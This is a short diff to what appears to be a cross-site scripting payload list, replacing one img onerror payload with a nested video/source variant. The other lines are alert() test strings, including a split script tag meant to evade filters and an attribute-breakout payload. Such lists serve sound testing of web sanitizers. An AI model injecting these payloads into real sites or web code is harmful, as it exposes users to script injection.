@@ -1,4 +1,4 @@
-<img src={{2*2}} onerror=alert(0)>
+<img src= <video><source onerror="javascript:alert(1)"> onerror=alert(0)>
 <script>alert('XSS')</script>
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 "><script>alert('XSS')</script>
